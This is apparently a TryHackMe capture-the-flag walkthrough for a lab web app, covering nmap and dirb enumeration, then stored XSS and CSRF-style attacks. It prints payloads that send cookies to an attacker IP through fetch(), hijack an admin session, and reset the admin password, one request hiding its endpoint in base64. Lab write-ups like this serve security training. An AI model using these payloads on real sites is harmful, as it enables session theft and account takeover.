---                                                                                                                   
  title: "What's your name? — TryHackMe walkthrough"          
  description: "This challenge will test client-side exploitation skills, from inspecting Javascript to manipulating cookies to launching CSRF/XSS attacks."                                               
  date: "2026-03-11"                                        
  headerImage: "https://tryhackme-images.s3.amazonaws.com/room-icons/62a7685ca6e7ce005d3f3afe-1718463471016"
  tags: TryHackMe, Web App Security                                                                          
---                                                                                                                   

## URL
https://tryhackme.com/room/whatsyourname\

## Set up
Add the file to host name `echo "$IP worldwap.thm" >> /etc/hosts"`

## Enumeration
- Run nmap scan on the target machine `nmap -A -sV -p- worldwap.thm`

<img width="1286" height="1011" alt="Screenshot 2026-03-11 131800" src="https://github.com/user-attachments/assets/1ee166cd-f917-4256-a646-bb04b534ac92" />


-> 3 open ports: 22, 80, 8081. The two port 80 & 8081 are using Apache servers. Hence we run directory enumeration on these two ports

- Enumeration on port 80: `dirb http://worldwap.thm -X .php,.txt,.html,.py,.json,.js`

<img width="1120" height="577" alt="Screenshot 2026-03-11 132112" src="https://github.com/user-attachments/assets/49e150b2-2540-40c7-9f7b-aca1f9bd4947" />
  
- Enumeration on port 8081: `dirb http://worldwap.thm:8081 -X .php,.txt,.html,.py,.json,.js`

  <img width="1098" height="804" alt="Screenshot 2026-03-11 132302" src="https://github.com/user-attachments/assets/668df3d1-afc5-4edb-b207-207416d05836" />

### Flag 1
- Navigate to http://worldwap.thm and click the Register link. On the Register link, inject this payload into either (or both) of the **email** & **Name** fields: `<script>fetch('http://10.112.108.176:5555eal?c='+document.cookie)</script>`

<img width="1496" height="713" alt="Screenshot 2026-03-11 132804" src="https://github.com/user-attachments/assets/37c81422-9563-4feb-a2bd-335c9d17858e" />

- Submit the registration form.
- Set up a listener on our attack box: `python3 -m http.server 5555`
- After few minutes, we should get cookie sessions.

<img width="1144" height="179" alt="Screenshot 2026-03-11 135550" src="https://github.com/user-attachments/assets/534142fb-d537-4caa-a875-d8d7daa19ba7" />

- After the registration, we are told on the website to log in at: **http://login.worldwap.thm**
- View page source of **http://login.worldwap.thm**, we find a login endpoint **`/login.php`** (make sure to add `login.worldwap.thm` to the host file)
- Navigate to the login page. this should be the exploit surface. URL should be: **http://login.worldwap.thm/login.php**
- Copy the cookie, paste it into the login page's cookie session. Then refresh the page

<img width="1946" height="1011" alt="Screenshot 2026-03-11 140030" src="https://github.com/user-attachments/assets/e68ce7ce-0041-4c1e-88d0-97c1988620fb" />

- Once logged in, we retrieve the first flag.
  
<img width="1205" height="644" alt="image" src="https://github.com/user-attachments/assets/c971c87f-bee3-4ef1-9f6a-eaf3cb179217" />

NOTE: In real world, once you enumerate the directory on both port, you'll see that on port 80, there's **`4.py`** whereas on port 8081, there's **`admin.py`**. Reading these two files will help us obtain the credentials to log in, hence retrieving the flags. However, it's not the purpose of this room. So we continue to exploit the front-end of the application.

### Flag 2
- There are 3 ways to retrieve flag 2. We first need to confirm the chatbot is vulnerable to XSS `<script>alert('test')</script>`
- There should be an alert.
- TIPS: Reset the chatbot / Clear all chats when you experiment different payloads

#### Flag 2.1 
1. Inject the following payload into the chatbot

```
<script>
  fetch("/chat.php", {
    "credentials": "include",
    "headers": {
        "Content-Type": "application/x-www-form-urlencoded"
    },
    "body": "message="+document.cookie,
    "method": "POST",
    "mode": "cors"
  });
</script>
```

2. Trigger another XSS `<script>alert(2)</script>`
3. We should get the admin's cookie session

<img width="837" height="390" alt="Screenshot 2026-03-11 at 8 10 14 PM" src="https://github.com/user-attachments/assets/ea6d9477-c90d-4aa0-a851-2f883c12843a" />

4. Replace the current cookie with admin's & we should get the flag.

   
#### Flag 2.2
  1. Inject this payload into the chatbot

```
<script>
  fetch('/change_password.php', {
    method: 'POST',
    credentials: 'include',  
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'new_password=password'
  });
</script>
```
  2. Trigger another payload `<script>alert(1)</script>`
  3. Log out and login as the admin with a new password `admin:password`

#### Flag 2.3
1. Inject the following payload into the Chatbot to change the admin's password to `pass123`:
```
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('POST', atob('aHR0cDovL3dvcmxkd2FwLnRobTo4MDgxL2NoYW5nZV9wYXNzd29yZC5waHA='), true);
  xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  xhr.onreadystatechange = function () {
    if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
      alert('Password changed');
    }
  };
  xhr.send('action=execute&new_password=pass123');
</script>
```
2. We should get an alert **"Password changed"** if the attack is successful
   
<img width="1419" height="695" alt="Screenshot 2026-03-11 at 8 49 18 PM" src="https://github.com/user-attachments/assets/1e1cf7b7-ec14-49cb-a5b8-230bc8d1664e" />

3. Log in with the new password for admin `admin:pass123`

<img width="752" height="508" alt="Screenshot 2026-03-11 at 6 49 24 PM" src="https://github.com/user-attachments/assets/034094ff-b0e1-4be2-8c96-70089128653c" />
